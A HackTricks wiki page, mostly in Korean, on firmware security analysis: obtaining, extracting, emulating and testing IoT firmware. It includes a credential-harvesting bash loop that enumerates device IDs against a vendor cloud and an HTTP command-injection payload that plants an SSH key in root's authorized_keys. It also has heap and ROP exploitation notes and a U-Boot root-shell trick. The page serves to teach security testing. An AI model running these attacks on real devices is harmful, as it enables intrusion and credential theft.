# Firmware Analysis

{{#include ../../banners/hacktricks-training.md}}

## **Introduction**

### Related resources


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware는 장치가 하드웨어 구성 요소와 사용자가 상호작용하는 소프트웨어 간의 통신을 관리하고 원활하게 하여 올바르게 동작할 수 있게 해주는 필수 소프트웨어입니다. 이는 영구 메모리에 저장되어 있어, 장치가 전원이 켜지는 순간부터 중요한 명령에 접근할 수 있게 하며, 그 결과 운영 체제가 시작됩니다. Firmware를 검토하고 잠재적으로 수정하는 것은 보안 취약점을 식별하는 데 중요한 단계입니다.

## **Gathering Information**

**정보 수집**은 장치의 구성과 사용하는 기술을 이해하는 데 있어 중요한 초기 단계입니다. 이 과정에는 다음에 대한 데이터 수집이 포함됩니다.

- CPU 아키텍처와 실행하는 운영 체제
- Bootloader 세부 사항
- 하드웨어 레이아웃과 datasheets
- 코드베이스 지표와 소스 위치
- 외부 라이브러리와 라이선스 유형
- 업데이트 이력과 규제 인증
- 아키텍처 및 흐름 다이어그램
- 보안 평가와 확인된 취약점

이를 위해 **open-source intelligence (OSINT)** 도구는 매우 유용하며, 사용 가능한 open-source software 구성 요소에 대한 수동 및 자동 검토 과정도 마찬가지로 중요합니다. [Coverity Scan](https://scan.coverity.com)과 [Semmle’s LGTM](https://lgtm.com/#explore) 같은 도구는 잠재적 문제를 찾는 데 활용할 수 있는 무료 static analysis를 제공합니다.

## **Acquiring the Firmware**

Firmware를 확보하는 방법은 여러 가지가 있으며, 각 방법마다 복잡도 수준이 다릅니다.

- **직접** 소스에서 받기 (개발자, 제조사)
- 제공된 지침으로부터 **빌드**하기
- 공식 지원 사이트에서 **다운로드**하기
- 호스팅된 firmware 파일을 찾기 위해 **Google dork** 쿼리 활용하기
- [S3Scanner](https://github.com/sa7mon/S3Scanner) 같은 도구로 **cloud storage**에 직접 접근하기
- man-in-the-middle 기법으로 **업데이트** 가로채기
- **UART**, **JTAG**, 또는 **PICit** 같은 연결을 통해 장치에서 **추출**하기
- 장치 통신 내에서 업데이트 요청을 **sniffing**하기
- **hardcoded update endpoints**를 식별하고 사용하기
- **bootloader** 또는 네트워크에서 **dumping**하기
- 다른 방법이 모두 실패하면 적절한 하드웨어 도구를 사용해 저장 칩을 **분리하고 읽기**

### UART-only logs: force a root shell via U-Boot env in flash

If UART RX is ignored (logs only), you can still force an init shell by **editing the U-Boot environment blob** offline:

1. Dump SPI flash with a SOIC-8 clip + programmer (3.3V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Locate the U-Boot env partition, edit `bootargs` to include `init=/bin/sh`, and **recompute the U-Boot env CRC32** for the blob.
3. Reflash only the env partition and reboot; a shell should appear on UART.

This is useful on embedded devices where the bootloader shell is disabled but the env partition is writable via external flash access.

## Analyzing the firmware

이제 **firmware를 확보했으므로**, 어떻게 다룰지 알기 위해 그에 대한 정보를 추출해야 합니다. 이를 위해 사용할 수 있는 다양한 도구:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
만약 그런 tools로도 별로 찾지 못했다면 `binwalk -E <bin>`으로 이미지의 **entropy**를 확인하세요. entropy가 낮다면 encrypted되지 않았을 가능성이 높습니다. entropy가 높다면 encrypted되었을 가능성이 높습니다(또는 어떤 방식으로든 compressed된 것일 수 있습니다).

또한, 다음 tools를 사용해 firmware 안에 embedded된 **files**를 추출할 수 있습니다:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

또는 [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/))로 file을 inspect할 수 있습니다.

### Getting the Filesystem

앞서 언급한 `binwalk -ev <bin>` 같은 tools를 사용했다면 **filesystem을 추출**할 수 있었을 것입니다.\
Binwalk는 보통 이를 **filesystem type 이름의 folder** 안에 추출하며, 대개 다음 중 하나입니다: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Manual Filesystem Extraction

때때로 binwalk는 signatures에 filesystem의 **magic byte**를 가지고 있지 않을 수 있습니다. 이 경우 binwalk를 사용해 binary에서 filesystem의 **offset을 찾고**, compressed filesystem을 **carve**한 뒤, 아래 단계에 따라 그 type에 맞게 filesystem을 **manually extract**하세요.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
주어진 **dd command**를 실행하여 Squashfs filesystem을 carving하세요.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
또는, 다음 명령도 실행할 수 있습니다.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs의 경우 (위 예제에서 사용)

`$ unsquashfs dir.squashfs`

이후 파일은 "`squashfs-root`" 디렉터리에 있게 됩니다.

- CPIO archive files

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 filesystems의 경우

`$ jefferson rootfsfile.jffs2`

- NAND flash가 있는 ubifs filesystems의 경우

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## 펌웨어 분석

펌웨어를 얻은 후에는, 그 구조와 잠재적인 취약점을 이해하기 위해 이를 분해하는 것이 중요합니다. 이 과정은 다양한 도구를 사용해 펌웨어 이미지에서 가치 있는 데이터를 분석하고 추출하는 작업을 포함합니다.

### 초기 분석 도구

binary file(`<bin>`)의 초기 점검을 위한 명령 세트가 제공됩니다. 이 명령들은 file types를 식별하고, strings를 추출하며, binary data를 분석하고, partition 및 filesystem details를 이해하는 데 도움이 됩니다:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
이미지의 암호화 상태를 평가하려면 `binwalk -E <bin>`으로 **entropy**를 확인한다. 낮은 entropy는 암호화가 없음을 시사하고, 높은 entropy는 암호화 또는 압축 가능성을 나타낸다.

**embedded files**를 추출할 때는 **file-data-carving-recovery-tools** 문서와 파일 검사용 **binvis.io** 같은 도구와 리소스를 추천한다.

### Filesystem 추출

`binwalk -ev <bin>`을 사용하면 보통 filesystem을 추출할 수 있으며, 대개 squashfs, ubifs 같은 filesystem type 이름의 디렉터리로 풀린다. 그러나 **binwalk**가 missing magic bytes 때문에 filesystem type을 인식하지 못하면 수동 추출이 필요하다. 이 과정은 `binwalk`로 filesystem의 offset을 찾은 뒤, `dd` 명령으로 filesystem을 carve out하는 방식이다:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
이후에는 filesystem type(예: squashfs, cpio, jffs2, ubifs)에 따라 내용을 수동으로 추출하기 위해 다른 commands가 사용됩니다.

### Filesystem Analysis

filesystem이 추출되면 security flaws를 찾기 시작합니다. insecure network daemons, hardcoded credentials, API endpoints, update server 기능, uncompiled code, startup scripts, 그리고 offline analysis를 위한 compiled binaries에 주의를 기울입니다.

**점검할 주요 위치**와 **항목**은 다음과 같습니다:

- 사용자 credentials를 위한 **etc/shadow** 및 **etc/passwd**
- **etc/ssl**의 SSL certificates와 keys
- 잠재적 vulnerabilities가 있는 configuration 및 script files
- 추가 analysis를 위한 embedded binaries
- 일반적인 IoT device web servers와 binaries

다음 tools는 filesystem 내의 민감한 정보와 vulnerabilities를 찾는 데 도움이 됩니다:

- 민감한 정보 검색을 위한 [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) 및 [**Firmwalker**](https://github.com/craigz28/firmwalker)
- 포괄적인 firmware analysis를 위한 [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core)
- static 및 dynamic analysis를 위한 [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), 및 [**EMBA**](https://github.com/e-m-b-a/emba)

### Security Checks on Compiled Binaries

filesystem에서 찾은 source code와 compiled binaries 모두 vulnerabilities가 있는지 면밀히 검토해야 합니다. Unix binaries용 **checksec.sh**와 Windows binaries용 **PESecurity** 같은 tools는 exploit될 수 있는 보호되지 않은 binaries를 식별하는 데 도움이 됩니다.

## Harvesting cloud config and MQTT credentials via derived URL tokens

많은 IoT hubs는 per-device configuration을 다음과 비슷한 cloud endpoint에서 가져옵니다:

- `https://<api-host>/pf/<deviceId>/<token>`

firmware analysis 중에 `<token>`이 hardcoded secret을 사용해 device ID로부터 로컬에서 생성된다는 것을 발견할 수 있습니다. 예를 들어:

- token = MD5( deviceId || STATIC_KEY )이며 uppercase hex로 표현됨

이 설계는 deviceId와 STATIC_KEY를 아는 사람이 누구든 URL을 재구성하고 cloud config를 가져올 수 있게 해주며, 종종 plaintext MQTT credentials와 topic prefixes를 드러냅니다.

실용적 workflow:

1) UART boot logs에서 deviceId 추출

- 3.3V UART adapter(TX/RX/GND)를 연결하고 logs를 캡처합니다:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- cloud config URL 패턴과 broker address를 출력하는 lines를 찾으세요. 예:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) 펌웨어에서 STATIC_KEY와 token 알고리즘 복구

- binaries를 Ghidra/radare2에 로드하고 config path ("/pf/") 또는 MD5 사용을 검색합니다.
- algorithm을 확인합니다(예: MD5(deviceId||STATIC_KEY)).
- Bash에서 token을 유도하고 digest를 uppercase로 변환합니다:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) cloud config와 MQTT credentials 수집

- URL을 조합하고 curl로 JSON을 가져온 뒤, jq로 파싱해서 secrets를 추출합니다:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) 평문 MQTT와 취약한 topic ACL 악용하기(존재하는 경우)

- 복구한 credentials를 사용해 maintenance topics를 subscribe하고 민감한 events를 찾아라:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) 예측 가능한 device ID 열거하기 (대규모로, 허가 하에)

- 많은 ecosystem은 vendor OUI/product/type 바이트 뒤에 sequential suffix를 붙입니다.
- candidate ID를 반복하면서 token을 파생하고, config를 programmatically 가져올 수 있습니다:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Notes
- 대량 열거를 시도하기 전에 항상 명시적 승인을 받으세요.
- 가능한 경우, 대상 하드웨어를 수정하지 않고도 비밀을 복구하기 위해 emulation 또는 static analysis를 선호하세요.


firmware를 emulating하는 과정은 장치의 동작 또는 개별 program에 대한 **dynamic analysis**를 가능하게 합니다. 이 접근 방식은 hardware 또는 architecture 의존성으로 인해 어려움을 겪을 수 있지만, root filesystem이나 특정 binaries를 일치하는 architecture와 endianness를 가진 장치, 예를 들어 Raspberry Pi, 또는 미리 구축된 virtual machine으로 옮기면 추가 testing을 진행하는 데 도움이 될 수 있습니다.

### Emulating Individual Binaries

단일 programs를 검사할 때는 program의 endianness와 CPU architecture를 식별하는 것이 중요합니다.

#### Example with MIPS Architecture

MIPS architecture binary를 emulating하려면 다음 command를 사용할 수 있습니다:
```bash
file ./squashfs-root/bin/busybox
```
필요한 emulation tools를 설치하려면:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
For MIPS (big-endian), `qemu-mips` is used, and for little-endian binaries, `qemu-mipsel` would be the choice.

#### ARM Architecture Emulation

For ARM binaries, the process is similar, with the `qemu-arm` emulator being utilized for emulation.

### Full System Emulation

Tools like [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), and others, facilitate full firmware emulation, automating the process and aiding in dynamic analysis.

## Dynamic Analysis in Practice

At this stage, either a real or emulated device environment is used for analysis. It's essential to maintain shell access to the OS and filesystem. Emulation may not perfectly mimic hardware interactions, necessitating occasional emulation restarts. Analysis should revisit the filesystem, exploit exposed webpages and network services, and explore bootloader vulnerabilities. Firmware integrity tests are critical to identify potential backdoor vulnerabilities.

## Runtime Analysis Techniques

Runtime analysis involves interacting with a process or binary in its operating environment, using tools like gdb-multiarch, Frida, and Ghidra for setting breakpoints and identifying vulnerabilities through fuzzing and other techniques.

For embedded targets without a full debugger, **copy a statically-linked `gdbserver`** to the device and attach remotely:
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Zigbee / radio-co-processor message mapping

IoT hubs에서 RF stack은 종종 **radio MCU**와 Linux userland process로 분리된다. 유용한 workflow는 다음 path를 map하는 것이다:

1. 공중상의 **RF frame**
2. radio MCU의 **controller-side parser**
3. Linux로 전달되는 **serial/UART text or TLV protocol** (예: `/dev/tty*`)
4. main daemon의 **application dispatcher**
5. **protocol-specific handler / state machine**

이 architecture는 하나 대신 두 개의 reversing target을 만든다. controller가 binary radio frames를 `Group,Command,arg1,arg2,...` 같은 textual protocol로 변환한다면, 다음을 recover하라:

- **message groups**와 dispatch tables
- 어떤 messages가 **network**에서 올 수 있는지, 아니면 controller 자체에서 오는지
- 정확한 **manufacturer-specific discriminator fields** (예: Zigbee `manufacturer_code` 및 custom `cluster_command`)
- 어떤 handlers가 **commissioning**, discovery, 또는 firmware/model download phases에서만 reachable한지

Zigbee의 경우, pairing traffic을 capture하고 target이 여전히 기본 **Link Key** `ZigBeeAlliance09`에 의존하는지 확인하라. 그렇다면 commissioning traffic sniffing으로 **Network Key**가 노출될 수 있다. Zigbee 3.0 install codes는 이 exposure를 줄이므로, 테스트한 device가 실제로 이를 enforce하는지 기록하라.

### Manufacturer-specific protocol handlers and FSM-gated reachability

vendor-specific Zigbee/ZCL commands는 standardized clusters보다 더 좋은 target인 경우가 많다. 왜냐하면 이들은 **custom parsing code**와 내부 **FSMs**로 들어가며, 검증은 덜 battle-tested이기 때문이다.

Practical workflow:

- command dispatcher를 reverse해서 **vendor-only handler**를 찾는다.
- **FSM state**, **event**, **check**, **action**, **next-state** tables를 recover한다.
- 자동으로 advance되는 **transitional states**와, 결국 attacker-controlled state를 reset하거나 free하는 retry/error branches를 식별한다.
- buggy handler가 항상 reachable하다고 가정하지 말고, 취약한 state에 daemon을 두기 위해 필요한 정상 protocol exchanges를 확인한다.

timing-sensitive protocols에서는 Python framework의 packet replay가 너무 느릴 수 있다. 더 신뢰할 수 있는 접근은 real hardware(예: **nRF52840**)에서 vendor-grade stack으로 정상 device를 emulate하여 올바른 **endpoints**, **attributes**, commissioning timing을 노출하는 것이다.

### Fragmented-download bug class in embedded daemons

반복적으로 나타나는 firmware bug class는 **fragmented blob/model/configuration downloads**에서 발생한다:

1. **first fragment** (`offset == 0`)가 `ctx->total_size`를 저장하고 `malloc(total_size)`를 할당한다.
2. 이후 fragment들은 공격자가 통제하는 **packet-local** fields, 예를 들어 `packet_total_size >= offset + chunk_len`만 검증한다.
3. copy는 **original allocated size**를 확인하지 않고 `memcpy(&ctx->buffer[offset], chunk, chunk_len)`를 사용한다.

이것은 attacker가 다음을 보낼 수 있게 한다:

- 작은 declared total size를 가진 첫 valid fragment로 작은 heap allocation을 강제.
- 더 큰 `chunk_len`을 가진, 하지만 **expected offset**을 포함한 후속 fragment.
- 새 checks를 만족하면서도 원래 allocated buffer를 overflow하는 forged packet-local size.

취약한 path가 commissioning logic 뒤에 있다면, exploitation은 malformed fragments를 보내기 전에 target을 기대하는 model-download 또는 blob-download state로 유도할 충분한 **device emulation**을 포함해야 한다.

### Protocol-driven `free()` triggers

embedded daemons에서 heap metadata exploitation을 trigger하는 가장 쉬운 방법은 종종 "cleanup을 기다리는 것"이 아니라 **protocol의 자체 error handling을 강제로 실행시키는 것**이다:

- malformed follow-up fragments를 보내 FSM을 **retry** 또는 **error** states로 몰아넣는다.
- retry threshold를 넘겨 daemon이 **reset context**를 하고 corrupted buffer를 free하게 만든다.
- 이 예측 가능한 `free()`를 사용해, process가 다른 이유로 crash하기 전에 allocator-side primitives를 trigger한다.

이는 embedded Linux의 **musl/uClibc/dlmalloc-like** allocators에 특히 유용하다. chunk metadata를 corrupt하면 unlink/unbin logic을 write primitive로 바꿀 수 있기 때문이다. 안정적인 pattern은 실제 bin pointers를 즉시 덮어써서 process를 crash시키는 대신, **size field**를 corrupt하여 allocator traversal을 overflowed buffer 안에 staged된 **fake chunks**로 redirect하는 것이다.

## Binary Exploitation and Proof-of-Concept

식별된 vulnerabilities에 대한 PoC를 개발하려면 target architecture에 대한 깊은 이해와 저수준 언어 프로그래밍이 필요하다. embedded systems에서는 binary runtime protections가 드물지만, 존재한다면 Return Oriented Programming (ROP) 같은 기법이 필요할 수 있다.

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc는 glibc와 유사한 fastbins를 사용한다. 이후의 큰 allocation이 `__malloc_consolidate()`를 trigger할 수 있으므로, fake chunk는 checks를 통과해야 한다 (sane size, `fd = 0`, 그리고 주변 chunks가 "in use"로 보일 것).
- **Non-PIE binaries under ASLR:** ASLR이 enabled되어 있어도 main binary가 **non-PIE**이면, binary 내부 `.data/.bss` addresses는 안정적이다. 이미 valid heap chunk header처럼 보이는 region을 target으로 삼아 fastbin allocation을 **function pointer table** 위에 landing시킬 수 있다.
- **Parser-stopping NUL:** JSON이 parsed될 때 payload의 `\x00`는 parsing을 멈추게 하면서 trailing attacker-controlled bytes를 stack pivot/ROP chain에 남길 수 있다.
- **Shellcode via `/proc/self/mem`:** `open("/proc/self/mem")`, `lseek()`, `write()`를 호출하는 ROP chain은 known mapping에 executable shellcode를 심고 그것으로 jump할 수 있다.

## Prepared Operating Systems for Firmware Analysis

[AttifyOS](https://github.com/adi0x90/attifyos)와 [EmbedOS](https://github.com/scriptingxss/EmbedOS) 같은 operating systems는 필요한 tools를 갖춘 firmware security testing용 pre-configured environments를 제공한다.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS는 Internet of Things (IoT) devices에 대한 security assessment와 penetration testing을 수행하도록 돕기 위한 distro이다. 필요한 모든 tools가 loaded된 pre-configured environment를 제공해 많은 시간을 절약해준다.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): firmware security testing tools가 preload된 Ubuntu 18.04 기반 embedded security testing operating system.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

vendor가 firmware images에 대해 cryptographic signature checks를 구현하더라도, **version rollback (downgrade) protection**은 자주 생략된다. boot- 또는 recovery-loader가 embedded public key로 signature만 verify하고 flashed되는 image의 *version* (또는 monotonic counter)을 비교하지 않으면, attacker는 유효한 signature를 유지한 채 **older, vulnerable firmware**를 합법적으로 설치하여 이미 패치된 vulnerabilities를 다시 도입할 수 있다.

Typical attack workflow:

1. **Obtain an older signed image**
* vendor의 public download portal, CDN 또는 support site에서 가져온다.
* companion mobile/desktop applications에서 추출한다 (예: Android APK 안의 `assets/firmware/`).
* VirusTotal, Internet archives, forums 등 third-party repositories에서 가져온다.
2. **Upload or serve the image to the device** via any exposed update channel:
* Web UI, mobile-app API, USB, TFTP, MQTT, etc.
* 많은 consumer IoT devices는 Base64-encoded firmware blobs를 받아 server-side에서 decode하고 recovery/upgrade를 trigger하는 *unauthenticated* HTTP(S) endpoints를 노출한다.
3. downgrade 후, 더 최신 release에서 패치된 vulnerability를 exploit한다 (예: 나중에 추가된 command-injection filter).
4. 필요하면 최신 image를 다시 flash하거나, persistence를 확보한 뒤 detection을 피하기 위해 updates를 disable한다.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
취약한(다운그레이드된) firmware에서 `md5` 파라미터는 sanitisation 없이 shell command에 직접 연결되며, 이로 인해 임의 command injection이 가능해집니다(여기서는 SSH key-based root access를 활성화). 이후 firmware 버전에서는 기본적인 character filter가 도입되었지만, downgrade protection이 없어서 이 수정은 무의미합니다.

### 모바일 앱에서 Firmware 추출하기

많은 vendor는 companion mobile applications 안에 전체 firmware images를 함께 포함해서, app이 Bluetooth/Wi-Fi를 통해 device를 업데이트할 수 있게 합니다. 이러한 패키지는 일반적으로 `assets/fw/` 또는 `res/raw/` 같은 경로의 APK/APEX 내부에 암호화되지 않은 상태로 저장됩니다. `apktool`, `ghidra`, 또는 단순한 `unzip` 같은 tools를 사용하면 physical hardware를 건드리지 않고도 signed images를 추출할 수 있습니다.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Update Logic 평가 체크리스트

* *update endpoint*의 전송/인증이 충분히 보호되어 있는가 (TLS + authentication)?
* 디바이스가 flash하기 전에 **version numbers** 또는 **monotonic anti-rollback counter**를 비교하는가?
* image가 secure boot chain 내부에서 검증되는가 (예: ROM code에서 signatures를 확인)?
* userland code가 추가적인 sanity checks를 수행하는가 (예: 허용된 partition map, model number)?
* *partial* 또는 *backup* update 흐름이 동일한 validation logic을 재사용하는가?

> 💡  위 항목 중 하나라도 빠져 있다면, 해당 platform은 rollback attacks에 취약할 가능성이 높습니다.

## 연습용 Vulnerable firmware

firmware에서 vulnerabilities를 발견하는 연습을 위해, 다음 vulnerable firmware projects를 시작점으로 사용하세요.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Trainning and Cert

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [Make it Blink: Over-the-Air Exploitation of the Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)

{{#include ../../banners/hacktricks-training.md}}
